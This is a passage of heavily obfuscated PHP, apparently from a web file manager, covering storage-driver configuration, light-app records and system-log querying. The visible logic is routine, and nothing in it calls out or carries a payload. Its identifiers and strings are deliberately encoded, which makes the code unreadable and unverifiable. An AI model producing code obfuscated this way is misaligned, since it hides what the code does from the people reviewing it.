$Î½³ëØ = Model($êÁ†Á¯Æ[764])->field($¹–ß­¤)->where($›ĞºÈåÕ)->group($êÁ†Á¯Æ[792])->select(); $Î½³ëØ = array_to_keyvalue($Î½³ëØ, $êÁ†Á¯Æ[392], $êÁ†Á¯Æ[80]); Cache::set($¯é—²Úû, $Î½³ëØ, 600); return $Î½³ëØ; } public function getConfig($ïëªİÒë) { $ú×–´•— = parent::listData($ïëªİÒë); return json_decode($ú×–´•—[$_SERVER[ì…™Î¶Ï][6]], !0); } public function update($ÊĞ°Åç¯, $¾ıçˆø) { $œ·Û’É‚ =& $_SERVER[ì…™Î¶Ï]; $äÌì®ÓĞ = $¾ıçˆø[$œ·Û’É‚[32]]; $à„Äàœ¶ = array_to_keyvalue(parent::listData(), $œ·Û’É‚[32]); if (isset($à„Äàœ¶[$äÌì®ÓĞ]) && $à„Äàœ¶[$äÌì®ÓĞ][$œ·Û’É‚[392]] != $ÊĞ°Åç¯) { return !1; } if (isset($¾ıçˆø[$œ·Û’É‚[2105]]) && $¾ıçˆø[$œ·Û’É‚[2105]] == $œ·Û’É‚[89]) { $this->checkConfig($¾ıçˆø); } unset($¾ıçˆø[$œ·Û’É‚[2105]]); $ã®¥ó˜Ñ = parent::update($ÊĞ°Åç¯, $¾ıçˆø); if ($ã®¥ó˜Ñ && $¾ıçˆø[$œ·Û’É‚[37]]) { foreach ($à„Äàœ¶ as $Êë¹İÄ÷) { if ($Êë¹İÄ÷[$œ·Û’É‚[37]] && $Êë¹İÄ÷[$œ·Û’É‚[392]] != $ÊĞ°Åç¯) { parent::update($Êë¹İÄ÷[$œ·Û’É‚[392]], array($œ·Û’É‚[37] => 0)); } } } return $ã®¥ó˜Ñ; } public function add($ª€îğö’) { $·®«ÛŠõ =& $_SERVER[ì…™Î¶Ï]; $ôö“Ê ß = array_to_keyvalue(parent::listData(), $·®«ÛŠõ[32]); if (isset($ôö“Ê ß[$ª€îğö’[$·®«ÛŠõ[32]]])) { return !1; } $this->checkConfig($ª€îğö’); $—¾ÀãôÔ = parent::insert($ª€îğö’); if ($—¾ÀãôÔ && $ª€îğö’[$·®«ÛŠõ[37]]) { foreach ($ôö“Ê ß as $ùÁÌÇçü) { if ($ùÁÌÇçü[$·®«ÛŠõ[37]]) { parent::update($ùÁÌÇçü[$·®«ÛŠõ[392]], array($·®«ÛŠõ[37] => 0)); } } } return $—¾ÀãôÔ; } public function checkConfig(&$›±ëñ¬¾, $âÅª³©ò = false) { $ıÏœøİ =& $_SERVER[ì…™Î¶Ï]; $ê°‰À°– = strtolower($›±ëñ¬¾[$ıÏœøİ[96]]); $¶Íµ™ï² = json_decode($›±ëñ¬¾[$ıÏœøİ[6]], !0); foreach ($¶Íµ™ï² as $·ÃØÍ±Ò => $Ş¬õĞû´) { $¶Íµ™ï²[$·ÃØÍ±Ò] = trim($Ş¬õĞû´); } $¶Íµ™ï²[$ıÏœøİ[2106]] = rand_string(6); $ÁõÁÎê = $GLOBALS[$ıÏœøİ[6]][$ıÏœøİ[90]][$ıÏœøİ[801]]; $«êüá¨ = isset($ÁõÁÎê[$ê°‰À°–]) ? $ÁõÁÎê[$ê°‰À°–] : ucfirst($ê°‰À°–); $ùĞ‡Ò†ï = $ıÏœøİ[74] . $«êüá¨; if (!$«êüá¨ || !class_exists($ùĞ‡Ò†ï)) { if ($âÅª³©ò) { return LNG($ıÏœøİ[2107]); } write_log(array($ıÏœøİ[2108], $›±ëñ¬¾, get_caller_info()), $ıÏœøİ[2109]); show_json(LNG($ıÏœøİ[2107]), !1, $›±ëñ¬¾); } $¦êêÙ¦ = new $ùĞ‡Ò†ï($¶Íµ™ï²); if (in_array($ê°‰À°–, $¦êêÙ¦->objectDriver)) { if (!$¦êêÙ¦->isBucketCors() && !$¦êêÙ¦->setBucketCors()) { $ğµÜ¯‹ = LNG($ıÏœøİ[2110]); $ğµÜ¯‹ .= $ıÏœøİ[2111] . LNG($ıÏœøİ[2112]); if ($âÅª³©ò) { return $ğµÜ¯‹; } show_json($ğµÜ¯‹, !1); } } $–·èÍüÀ = rtrim($¶Íµ™ï²[$ıÏœøİ[1155]], $ıÏœøİ[8]) . $ıÏœøİ[8]; $ú¶¿Îã‘ = $¦êêÙ¦->getPath($–·èÍüÀ . $ıÏœøİ[1217]); if (!$¦êêÙ¦->mkfile($ú¶¿Îã‘)) { if ($âÅª³©ò) { return LNG($ıÏœøİ[2110]); } show_json(LNG($ıÏœøİ[2110]), !1); } $¶Íµ™ï²[$ıÏœøİ[1155]] = $–·èÍüÀ; $›±ëñ¬¾[$ıÏœøİ[6]] = json_encode($¶Íµ™ï²); $›±ëñ¬¾[$ıÏœøİ[96]] = $«êüá¨; return !0; } public function driverListSystem() { $ –ğÙã  =& $_SERVER[ì…™Î¶Ï]; $‚™ç¢´» = parent::listData(); $ê·ë´½˜ = array(); foreach ($‚™ç¢´» as $¸ÁÚğİÓ) { unset($¸ÁÚğİÓ[$ –ğÙã [193]], $¸ÁÚğİÓ[$ –ğÙã [86]]); $¸ÁÚğİÓ[$ –ğÙã [6]] = json_decode($¸ÁÚğİÓ[$ –ğÙã [6]], !0); $ê·ë´½˜[] = $¸ÁÚğİÓ; } return $ê·ë´½˜; } public function defaultDriver() { $ËÒµ³–€ =& $_SERVER[ì…™Î¶Ï]; $ëÜÂ«çë = parent::listData(); $¢±Ó†ˆ¥ = array_filter_by_field($ëÜÂ«çë, $ËÒµ³–€[37], 1); $¢±Ó†ˆ¥ = $¢±Ó†ˆ¥[0]; if ($¢±Ó†ˆ¥) { $¢±Ó†ˆ¥[$ËÒµ³–€[6]] = json_decode($¢±Ó†ˆ¥[$ËÒµ³–€[6]], !0); } return $¢±Ó†ˆ¥; } public function driverInfo($§ÎÂ®¶õ) { $ŞËãÈ…° =& $_SERVER[ì…™Î¶Ï]; $âË’˜ £ = array_to_keyvalue(parent::listData(), $ŞËãÈ…°[392]); if (!isset($âË’˜ £[$§ÎÂ®¶õ])) { return !1; } $©ä¹øŠ = $âË’˜ £[$§ÎÂ®¶õ]; $©ä¹øŠ[$ŞËãÈ…°[6]] = json_decode($©ä¹øŠ[$ŞËãÈ…°[6]], !0); return $©ä¹øŠ; } public function remove($ŸÕ®åê) { $this->removeShareItems($ŸÕ®åê); return parent::remove($ŸÕ®åê); } public function removeWithFile($Î§úÃ“, $ÅŒ±Ôä) { $ÍôåÏ« =& $_SERVER[ì…™Î¶Ï]; $ı¿ŒÓÊ = array($ÍôåÏ«[792] => $Î§úÃ“); $ƒÚ¸ï¥¼ = Model($ÍôåÏ«[461])->where($ı¿ŒÓÊ)->count(); $‰¨óŠÍæ = Model($ÍôåÏ«[461])->where($ı¿ŒÓÊ)->sum($ÍôåÏ«[80]); $ĞÃÜõ° = $ÅŒ±Ôä . $ÍôåÏ«[2113] . $Î§úÃ“; $¯¿Üô‰ô = new TaskFileTransfer($ĞÃÜõ°, $ÍôåÏ«[2109], $ƒÚ¸ï¥¼, LNG($ÍôåÏ«[2114]) . "\50{$Î§úÃ“}\51"); $¯¿Üô‰ô->task[$ÍôåÏ«[738]] = (double) $‰¨óŠÍæ; $Æ³ıÀòä = KodIO::defaultDriver(); $ò”ò—Å = $Æ³ıÀòä[$ÍôåÏ«[392]]; $ŸÏÂ°Ä‘ = "\x7b\x69\157\72{$ò”ò—Å}\x7d\57"; $ÆªÖÆĞ• = !0; $–Àâ‰© = array(); $ûÀ¤×Œ = Model($ÍôåÏ«[192])->where($ı¿ŒÓÊ)->field($ÍôåÏ«[2115])->select(); foreach ($ûÀ¤×Œ as $ÀÍ©ôœ¤) { $©”ŞŞş = $ÀÍ©ôœ¤[$ÍôåÏ«[78]]; $¥áæÔâ• = $ŸÏÂ°Ä‘ . str_replace("\x7b\151\157\x3a{$Î§úÃ“}\175\57", $ÍôåÏ«[12], $©”ŞŞş); if (!IO::exist($©”ŞŞş)) { $–Àâ‰©[] = $ÀÍ©ôœ¤[$ÍôåÏ«[458]]; $¯¿Üô‰ô->updateFileEnd($ÀÍ©ôœ¤[$ÍôåÏ«[32]], $ÀÍ©ôœ¤[$ÍôåÏ«[80]]); continue; } if (IO::exist($¥áæÔâ•)) { $¯¿Üô‰ô->updateFileEnd($ÀÍ©ôœ¤[$ÍôåÏ«[32]], $ÀÍ©ôœ¤[$ÍôåÏ«[80]]); continue; } if (!IO::move($©”ŞŞş, get_path_father($¥áæÔâ•))) { $ÆªÖÆĞ• = !1; break; } $ı¿ŒÓÊ = array($ÍôåÏ«[458] => $ÀÍ©ôœ¤[$ÍôåÏ«[458]]); $ç¡¾ê¸½ = array($ÍôåÏ«[792] => $ò”ò—Å, $ÍôåÏ«[78] => $¥áæÔâ•); Model($ÍôåÏ«[192])->where($ı¿ŒÓÊ)->save($ç¡¾ê¸½); } $this->removeByFileID($–Àâ‰©); if (!$ÆªÖÆĞ•) { $¯¿Üô‰ô->stop($ĞÃÜõ°); return !1; } $¯¿Üô‰ô->end(); if ($ÅŒ±Ôä == $ÍôåÏ«[1768]) { $this->remove($Î§úÃ“); } } public function progress($ßïŞş‚, $©ÀÑİ¯•) { return Task::get($©ÀÑİ¯• . $_SERVER[ì…™Î¶Ï][2113] . $ßïŞş‚); } private function removeByFileID($âÈ°òó = array()) { $Š¼éâºÓ =& $_SERVER[ì…™Î¶Ï]; if (empty($âÈ°òó)) { return; } $ÇÒÁÖ¬Õ = array($Š¼éâºÓ[458] => array($Š¼éâºÓ[7], $âÈ°òó)); $²çÒ§î = Model($Š¼éâºÓ[1301])->where($ÇÒÁÖ¬Õ)->field($Š¼éâºÓ[394])->select(); if (!$²çÒ§î) { return; } $²çÒ§î = array_to_keyvalue($²çÒ§î, $Š¼éâºÓ[12], $Š¼éâºÓ[394]); foreach ($²çÒ§î as $è•ì€½¡) { Model($Š¼éâºÓ[408])->removeNow($è•ì€½¡, !1); } } private function removeShareItems($¶Á½æ) { $£©¸¢í¥ =& $_SERVER[ì…™Î¶Ï]; $Ø©²”‡Í = "\173\151\x6f\72{$¶Á½æ}\175\57"; $‚ÚëšÛ° = array($£©¸¢í¥[394] => 0, $£©¸¢í¥[1150] => array($£©¸¢í¥[378], "{$Ø©²”‡Í}\x25")); $ä™…œÙÊ = Model($£©¸¢í¥[1779])->where($‚ÚëšÛ°)->field($£©¸¢í¥[479])->select(); if (empty($ä™…œÙÊ)) { return; } $¶şõïŠÚ = array_to_keyvalue($ä™…œÙÊ, $£©¸¢í¥[12], $£©¸¢í¥[479]); Model($£©¸¢í¥[586])->remove($¶şõïŠÚ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\114\151\147\150\x74\x41\160\160"; public $modelType = "\x53\x79\163\164\145\x6d\117\160\x74\x69\157\x6e"; public $field = array("\156\x61\x6d\x65", "\147\x72\157\x75\x70", "\144\145\163\143", "\x63\x6f\156\164\145\x6e\x74"); public function listData($²»­Ã¦ = false, $Ê™‡¹¦† = "\x6d\157\144\x69\146\171\x54\x69\155\x65", $úœêÅ§ = true) { return parent::listData($²»­Ã¦, $Ê™‡¹¦†, $úœêÅ§); } public function remove($‹¶‚ªÍÏ) { $±·‹ğ“ = $this->findByName($‹¶‚ªÍÏ); if (!$±·‹ğ“) { return !1; } return parent::remove($±·‹ğ“[$_SERVER[ì…™Î¶Ï][392]]); } public function add($ã½½ûÓ) { if ($this->findByName($ã½½ûÓ[$_SERVER[ì…™Î¶Ï][32]])) { return !1; } return parent::insert($ã½½ûÓ); } public function update($Ö¸—‘, $úçæ§‰) { $Ş¢µİÂ¦ =& $_SERVER[ì…™Î¶Ï]; $¶šó…à² = $this->findByName($Ö¸—‘); $ÌŒçÀÎ = $this->findByName($úçæ§‰[$Ş¢µİÂ¦[32]]); if (!$¶šó…à² || $ÌŒçÀÎ && $ÌŒçÀÎ[$Ş¢µİÂ¦[392]] != $¶šó…à²[$Ş¢µİÂ¦[392]]) { return !1; } return parent::update($¶šó…à²[$Ş¢µİÂ¦[392]], $úçæ§‰); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\155\x5f\154\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\x54\151\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\x65\162\x74", "\146\x75\156\x63\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ö¨ëø×Ã =& $_SERVER[ì…™Î¶Ï]; return array($ö¨ëø×Ã[2116] => LNG($ö¨ëø×Ã[2117]), $ö¨ëø×Ã[2118] => LNG($ö¨ëø×Ã[2119]), $ö¨ëø×Ã[1742] => LNG($ö¨ëø×Ã[2120]), $ö¨ëø×Ã[2121] => LNG($ö¨ëø×Ã[2122]), $ö¨ëø×Ã[2123] => LNG($ö¨ëø×Ã[2124]), $ö¨ëø×Ã[2125] => LNG($ö¨ëø×Ã[2126]), $ö¨ëø×Ã[2127] => LNG($ö¨ëø×Ã[2128]), $ö¨ëø×Ã[1772] => LNG($ö¨ëø×Ã[2128]), $ö¨ëø×Ã[1773] => LNG($ö¨ëø×Ã[2129]), $ö¨ëø×Ã[2130] => LNG($ö¨ëø×Ã[2131]), $ö¨ëø×Ã[2132] => LNG($ö¨ëø×Ã[2133]), $ö¨ëø×Ã[2134] => LNG($ö¨ëø×Ã[2135]), $ö¨ëø×Ã[2136] => LNG($ö¨ëø×Ã[2137]), $ö¨ëø×Ã[1770] => LNG($ö¨ëø×Ã[2138]), $ö¨ëø×Ã[2139] => LNG($ö¨ëø×Ã[2140]), $ö¨ëø×Ã[1777] => LNG($ö¨ëø×Ã[2141]), $ö¨ëø×Ã[2142] => LNG($ö¨ëø×Ã[2143]), $ö¨ëø×Ã[2144] => LNG($ö¨ëø×Ã[2145]), $ö¨ëø×Ã[2146] => LNG($ö¨ëø×Ã[2147]), $ö¨ëø×Ã[2148] => LNG($ö¨ëø×Ã[2149]), $ö¨ëø×Ã[1780] => LNG($ö¨ëø×Ã[2150]), $ö¨ëø×Ã[1781] => LNG($ö¨ëø×Ã[2151]), $ö¨ëø×Ã[2152] => LNG($ö¨ëø×Ã[2153]), $ö¨ëø×Ã[2154] => LNG($ö¨ëø×Ã[2155]), $ö¨ëø×Ã[2156] => LNG($ö¨ëø×Ã[2157]), $ö¨ëø×Ã[1775] => LNG($ö¨ëø×Ã[2158]), $ö¨ëø×Ã[2159] => LNG($ö¨ëø×Ã[2160]), $ö¨ëø×Ã[1774] => LNG($ö¨ëø×Ã[2161]), $ö¨ëø×Ã[2162] => LNG($ö¨ëø×Ã[2163]), $ö¨ëø×Ã[2164] => LNG($ö¨ëø×Ã[2165]), $ö¨ëø×Ã[2166] => LNG($ö¨ëø×Ã[2167]), $ö¨ëø×Ã[2168] => LNG($ö¨ëø×Ã[2168]), $ö¨ëø×Ã[2169] => LNG($ö¨ëø×Ã[1746]), $ö¨ëø×Ã[2170] => LNG($ö¨ëø×Ã[2171]), $ö¨ëø×Ã[2172] => LNG($ö¨ëø×Ã[2173]), $ö¨ëø×Ã[2174] => LNG($ö¨ëø×Ã[2175]), $ö¨ëø×Ã[2176] => LNG($ö¨ëø×Ã[2177]), $ö¨ëø×Ã[2178] => LNG($ö¨ëø×Ã[2179]), $ö¨ëø×Ã[2180] => LNG($ö¨ëø×Ã[2180]), $ö¨ëø×Ã[2181] => LNG($ö¨ëø×Ã[2182]), $ö¨ëø×Ã[2183] => LNG($ö¨ëø×Ã[2184]), $ö¨ëø×Ã[2185] => LNG($ö¨ëø×Ã[2186]), $ö¨ëø×Ã[2187] => LNG($ö¨ëø×Ã[2188]), $ö¨ëø×Ã[2189] => LNG($ö¨ëø×Ã[2190]), $ö¨ëø×Ã[2191] => LNG($ö¨ëø×Ã[2192])); } private function typeFile() { $çÃË–õ• =& $_SERVER[ì…™Î¶Ï]; $õóÍæ¦ = array($çÃË–õ•[1777] => array($çÃË–õ•[1778]), $çÃË–õ•[2134] => array($çÃË–õ•[2193]), $çÃË–õ•[2136] => array($çÃË–õ•[2194]), $çÃË–õ•[1770] => array($çÃË–õ•[1771]), $çÃË–õ•[2144] => array(), $çÃË–õ•[2146] => array(), $çÃË–õ•[2148] => array(), $çÃË–õ•[1780] => array($çÃË–õ•[1782]), $çÃË–õ•[1781] => array($çÃË–õ•[1782]), $çÃË–õ•[2152] => array($çÃË–õ•[2195]), $çÃË–õ•[2154] => array($çÃË–õ•[2195]), $çÃË–õ•[2156] => array($çÃË–õ•[2196]), $çÃË–õ•[2142] => array($çÃË–õ•[2197]), $çÃË–õ•[1775] => array($çÃË–õ•[2198]), $çÃË–õ•[2159] => array($çÃË–õ•[2199]), $çÃË–õ•[1774] => array($çÃË–õ•[1776])); return $õóÍæ¦; } private function typeAll() { $ÈÀÂ¿¿¸ =& $_SERVER[ì…™Î¶Ï]; $×õøí¦µ = $this->typeList; $éŞ«Ú‹­ = array_filter($this->typeFile()); foreach ($éŞ«Ú‹­ as $—Ğ„ÎÆ => $‡áÕÜİÙ) { $×õøí¦µ[$‡áÕÜİÙ[0]] = $×õøí¦µ[$—Ğ„ÎÆ]; } $×õøí¦µ[$ÈÀÂ¿¿¸[1782]] = LNG($ÈÀÂ¿¿¸[2200]); $×õøí¦µ[$ÈÀÂ¿¿¸[2195]] = LNG($ÈÀÂ¿¿¸[2201]); return $×õøí¦µ; } public function addLog($óô¥‹î, $îàÚé¢ = array()) { $éÆÌ„× =& $_SERVER[ì…™Î¶Ï]; if (!isset($this->typeList[$óô¥‹î])) { return; } $¯íé¨ğ = defined($éÆÌ„×[465]) && USER_ID ? USER_ID : (isset($îàÚé¢[$éÆÌ„×[1631]]) ? $îàÚé¢[$éÆÌ„×[1631]] : 0); if (!$¯íé¨ğ) { $¯íé¨ğ = (int) Session::get($éÆÌ„×[1931]); } $Šâ¨Ÿè = get_client_ip(); if (!$îàÚé¢ || strlen(json_encode($îàÚé¢)) >= 1024) { $îàÚé¢ = array($éÆÌ„×[2202] => $Šâ¨Ÿè); } else { if (is_array($îàÚé¢)) { $îàÚé¢[$éÆÌ„×[2202]] = $Šâ¨Ÿè; } else { $îàÚé¢ = array($éÆÌ„×[1167] => $îàÚé¢, $éÆÌ„×[2202] => $Šâ¨Ÿè); } } $îàÚé¢ = array($éÆÌ„×[1621] => Session::sign(), $éÆÌ„×[1622] => $¯íé¨ğ, $éÆÌ„×[33] => $óô¥‹î, $éÆÌ„×[1624] => json_encode($îàÚé¢)); parent::add($îàÚé¢); } public function remove($¥¼¹øÀ•) { $this->where(array($_SERVER[ì…™Î¶Ï][411] => $¥¼¹øÀ•))->delete(); } private function _makeOrder($û’‡íª = '') { $¤†ÎÒ =& $_SERVER[ì…™Î¶Ï]; $‘¹àüòû = $¤†ÎÒ[193]; $°¤†¬Ä¤ = array($¤†ÎÒ[439] => $¤†ÎÒ[440], $¤†ÎÒ[441] => $¤†ÎÒ[442]); $À·ÔŸ³‘ = Input::get($¤†ÎÒ[447], $¤†ÎÒ[7], $¤†ÎÒ[1963], array($¤†ÎÒ[1889], $¤†ÎÒ[441])); $À·ÔŸ³‘ = $°¤†¬Ä¤[$À·ÔŸ³‘]; $û’‡íª = $û’‡íª . "{$‘¹àüòû}\x20{$À·ÔŸ³‘}"; return $this->order($û’‡íª); } public function get($¹Øüë = '') { $¤¸ÑÉ =& $_SERVER[ì…™Î¶Ï]; if (!$¹Øüë) { show_json(array()); } $ÙîæŞ‰Ë = array(); if ($¹Øüë[$¤¸ÑÉ[1631]]) { $ÙîæŞ‰Ë[$¤¸ÑÉ[1631]] = $¹Øüë[$¤¸ÑÉ[1631]]; } if (isset($¹Øüë[$¤¸ÑÉ[736]])) { $íûñÛï¨ = $¹Øüë[$¤¸ÑÉ[736]]; $ˆ—åÛª = isset($¹Øüë[$¤¸ÑÉ[487]]) ? $¹Øüë[$¤¸ÑÉ[487]] : time(); $ÙîæŞ‰Ë[$¤¸ÑÉ[193]] = array($¤¸ÑÉ[328], array($íûñÛï¨, $ˆ—åÛª)); } if ($¹Øüë[$¤¸ÑÉ[33]]) { $™¸¯¢Å = explode($¤¸ÑÉ[50], $¹Øüë[$¤¸ÑÉ[33]]); $éÃÎÓéŞ = $this->typeFile(); $Ùúë¸ÙŸ = array(); foreach ($™¸¯¢Å as $ò…€Ò˜±) { $Ùúë¸ÙŸ[] = $ò…€Ò˜±; if (isset($éÃÎÓéŞ[$ò…€Ò˜±])) { $Ùúë¸ÙŸ = array_merge($Ùúë¸ÙŸ, $éÃÎÓéŞ[$ò…€Ò˜±]); } } $Ùúë¸ÙŸ = array_unique($Ùúë¸ÙŸ); if ($Ùúë¸ÙŸ) { $ÙîæŞ‰Ë[$¤¸ÑÉ[33]] = array($¤¸ÑÉ[7], $Ùúë¸ÙŸ); } } else { $ÙîæŞ‰Ë[$¤¸ÑÉ[33]] = array($¤¸ÑÉ[2203], $¤¸ÑÉ[2204]); } if (!empty($¹Øüë[$¤¸ÑÉ[2202]])) { $ÙîæŞ‰Ë[$¤¸ÑÉ[442]] = array($¤¸ÑÉ[378], "\x25{$¹Øüë[$¤¸ÑÉ[2202]]}\x25"); } $ß³ßı = $this->_makeOrder()->where($ÙîæŞ‰Ë)->selectPage(); if (empty($ß³ßı[$¤¸ÑÉ[364]])) { show_json(array(), !0, $ß³ßı[$¤¸ÑÉ[361]]); } $ß³ßı[$¤¸ÑÉ[364]] = $this->logList($ß³ßı[$¤¸ÑÉ[364]]); return $ß³ßı; } private function ipAddress(&$±ÒË·¡Ã) { $ÒÉ•¥¿© =& $_SERVER[ì…™Î¶Ï]; if (!empty($±ÒË·¡Ã[$ÒÉ•¥¿©[2202]])) { $‘èãàäû = IpLocation::get($±ÒË·¡Ã[$ÒÉ•¥¿©[2202]]); } else { $‘èãàäû = LNG($ÒÉ•¥¿©[2205]); } $±ÒË·¡Ã[$ÒÉ•¥¿©[2206]] = $‘èãàäû; } private function descZipDownload($Óš™µ„„, &$ç”úÌûã) { $·É’¶û =& $_SERVER[ì…™Î¶Ï]; if (!isset($Óš™µ„„[$·É’¶û[2207]])) { return; } $×úîñÉÉ = json_decode($Óš™µ„„[$·É’¶û[2207]], !0); foreach ($×úîñÉÉ as $ƒ°¦Äö ) { try { $­„÷Şª˜ = IO::infoFull($ƒ°¦Äö [$·É’¶û[78]]); } catch (Exception $ôª™¤) { continue; } $Óš™µ„„[$·É’¶û[78]] = $ƒ°¦Äö [$·É’¶û[78]]; $ç”úÌûã[] = $Óš™µ„„[$·É’¶û[394]] = $­„÷Şª˜[$·É’¶û[394]]; $ç”úÌûã[] = $Óš™µ„„[$·É’¶û[2017]] = $­„÷Şª˜[$·É’¶û[489]]; break; } return $Óš™µ„„; } private function getSourceList(&$©şØ«ñı) { $´³çú¾Ğ =& $_SERVER[ì…™Î¶Ï]; $ıÕİ‘Ä‡ = array(); foreach ($©şØ«ñı as $†ì°Ò®ì => $°ÁÀÜÍ§) { $Ûşî†…¼ = json_decode($°ÁÀÜÍ§[$´³çú¾Ğ[442]], !0); if ($°ÁÀÜÍ§[$´³çú¾Ğ[33]] == $´³çú¾Ğ[1773]) { $Ûşî†…¼ = $this->descZipDownload($Ûşî†…¼, $ıÕİ‘Ä‡); $©şØ«ñı[$†ì°Ò®ì][$´³çú¾Ğ[442]] = json_encode($Ûşî†…¼); continue; } if (strpos($°ÁÀÜÍ§[$´³çú¾Ğ[33]], $´³çú¾Ğ[2019]) !== 0) { if (!isset($Ûşî†…¼[$´³çú¾Ğ[78]]) || strpos($°ÁÀÜÍ§[$´³çú¾Ğ[33]], $´³çú¾Ğ[2208]) !== 0) { continue; } try { $Ûê÷à¸© = IO::infoFull($Ûşî†…¼[$´³çú¾Ğ[78]]); } catch (Exception $ÊşÉŸı÷) { continue; } $ıÕİ‘Ä‡[] = $Ûşî†…¼[$´³çú¾Ğ[394]] = $Ûê÷à¸©[$´³çú¾Ğ[394]]; $ıÕİ‘Ä‡[] = $Ûşî†…¼[$´³çú¾Ğ[2017]] = $Ûê÷à¸©[$´³çú¾Ğ[489]]; $©şØ«ñı[$†ì°Ò®ì][$´³çú¾Ğ[442]] = json_encode($Ûşî†…¼); continue; } $ıÕİ‘Ä‡[] = $Ûşî†…¼[$´³çú¾Ğ[394]]; $ıÕİ‘Ä‡[] = $Ûşî†…¼[$´³çú¾Ğ[2017]]; if ($Ûşî†…¼[$´³çú¾Ğ[33]] == $´³çú¾Ğ[542]) { $ıÕİ‘Ä‡[] = $Ûşî†…¼[$´³çú¾Ğ[442]][$´³çú¾Ğ[1134]]; $ıÕİ‘Ä‡[] = $Ûşî†…¼[$´³çú¾Ğ[442]][$´³çú¾Ğ[1135]]; } if ($Ûşî†…¼[$´³çú¾Ğ[33]] == $´³çú¾Ğ[2026]) { $ıÕİ‘Ä‡[] = $Ûşî†…¼[$´³çú¾Ğ[442]][$´³çú¾Ğ[394]]; } } if (!$ıÕİ‘Ä‡) { return array(); } return Model($´³çú¾Ğ[800])->sourceListInfo($ıÕİ‘Ä‡, !0); } private function logList($¢³½õ‹ü) { $Ìú¡Å =& $_SERVER[ì…™Î¶Ï]; $Î£‰‰·º = array_to_keyvalue($¢³½õ‹ü, $Ìú¡Å[12], $Ìú¡Å[1631]); $Òé­Ü¬» = Model($Ìú¡Å[529])->userListInfo(array_unique($Î£‰‰·º)); $Ã»Éæûï = $this->getSourceList($¢³½õ‹ü); $ãÛ–ÏÂö = $this->typeAll(); $õ£Äµ·¡ = array(); $Š±¾¥¨Ì = array(); foreach ($¢³½õ‹ü as $“ŞğÒÇÄ => $ø¿àƒ•) { $•‰èÊ² = $ø¿àƒ•[$Ìú¡Å[33]]; $““†Œš× = isset($Òé­Ü¬»[$ø¿àƒ•[$Ìú¡Å[1631]]]) ? $Òé­Ü¬»[$ø¿àƒ•[$Ìú¡Å[1631]]] : !1; $Ú×¨×ÂÁ = strpos($•‰èÊ², $Ìú¡Å[2209]) === 0 ? LNG($Ìú¡Å[2210]) : LNG($Ìú¡Å[2205]); $ø¿àƒ•[$Ìú¡Å[32]] = isset($““†Œš×[$Ìú¡Å[32]]) ? $““†Œš×[$Ìú¡Å[32]] : LNG($Ìú¡Å[2205]); $ø¿àƒ•[$Ìú¡Å[2068]] = isset($““†Œš×[$Ìú¡Å[2068]]) ? $““†Œš×[$Ìú¡Å[2068]] : $Ìú¡Å[12]; $ø¿àƒ•[$Ìú¡Å[1531]] = isset($ãÛ–ÏÂö[$•‰èÊ²]) ? $ãÛ–ÏÂö[$•‰èÊ²] : $Ú×¨×ÂÁ; $ø¿àƒ•[$Ìú¡Å[1962]] = $““†Œš×; $¡øíà· = json_decode($ø¿àƒ•[$Ìú¡Å[442]], !0); $ø¿àƒ•[$Ìú¡Å[2202]] = isset($¡øíà·[$Ìú¡Å[2202]]) ? $¡øíà·[$Ìú¡Å[2202]] : $Ìú¡Å[12]; $ø¿àƒ•[$Ìú¡Å[2206]] = IpLocation::get($ø¿àƒ•[$Ìú¡Å[2202]]); if (strpos($•‰èÊ², $Ìú¡Å[2019]) === 0 || isset($¡øíà·[$Ìú¡Å[2017]])) { $¡øíà·[$Ìú¡Å[87]] = $Ã»Éæûï[$¡øíà·[$Ìú¡Å[394]]]; $¡øíà·[$Ìú¡Å[2031]] = $Ã»Éæûï[$¡øíà·[$Ìú¡Å[2017]]]; if ($¡øíà·[$Ìú¡Å[33]] == $Ìú¡Å[542]) { $¡øíà·[$Ìú¡Å[442]][$Ìú¡Å[1134]] = $Ã»Éæûï[$¡øíà·[$Ìú¡Å[442]][$Ìú¡Å[1134]]]; $¡øíà·[$Ìú¡Å[442]][$Ìú¡Å[1135]] = $Ã»Éæûï[$¡øíà·[$Ìú¡Å[442]][$Ìú¡Å[1135]]]; } if ($¡øíà·[$Ìú¡Å[33]] == $Ìú¡Å[2026]) { $¡øíà·[$Ìú¡Å[442]][$Ìú¡Å[394]] = $Ã»Éæûï[$¡øíà·[$Ìú¡Å[442]][$Ìú¡Å[394]]]; } if ($¡øíà·[$Ìú¡Å[33]] == $Ìú¡Å[1768]) { $¡øíà·[$Ìú¡Å[2031]] = $¡øíà·[$Ìú¡Å[87]]; $¡øíà·[$Ìú¡Å[2017]] = $¡øíà·[$Ìú¡Å[2031]][$Ìú¡Å[394]]; $¡øíà·[$Ìú¡Å[87]] = !1; $¡øíà·[$Ìú¡Å[394]] = $Ìú¡Å[12]; } if ($¡øíà·[$Ìú¡Å[87]] && $¡øíà·[$Ìú¡Å[87]][$Ìú¡Å[403]] == $Ìú¡Å[1250]) { $Š±¾¥¨Ì[] = $ø¿àƒ•[$Ìú¡Å[392]]; unset($¢³½õ‹ü[$“ŞğÒÇÄ]); continue; } if ($¡øíà·[$Ìú¡Å[2031]] && $¡øíà·[$Ìú¡Å[2031]][$Ìú¡Å[403]] == $Ìú¡Å[1250]) { $Š±¾¥¨Ì[] = $ø¿àƒ•[$Ìú¡Å[392]]; unset($¢³½õ‹ü[$“ŞğÒÇÄ]); continue; } } $ø¿àƒ•[$Ìú¡Å[442]] = $¡øíà·; unset($ø¿àƒ•[$Ìú¡Å[2211]]); $õ£Äµ·¡[] = $ø¿àƒ•; } $this->clearSystemPathLog($Š±¾¥¨Ì); return $õ£Äµ·¡; } private function clearSystemPathLog($áâš›) { $‹·óĞ„™ =& $_SERVER[ì…™Î¶Ï]; if (count($áâš›) == 0) { return; } $¥êùÆÖ± = array($‹·óĞ„™[392] => array($‹·óĞ„™[7], array_unique($áâš›))); $this->where($¥êùÆÖ±)->delete(); } public function deviceList($ù¥ù’Ô, $ÓÈ±ú¿¼ = 0) { $–µû³Ò‹ =& $_SERVER[ì…™Î¶Ï]; $±ÙÑ–£ = array($–µû³Ò‹[1631] => $ù¥ù’Ô, $–µû³Ò‹[193] => 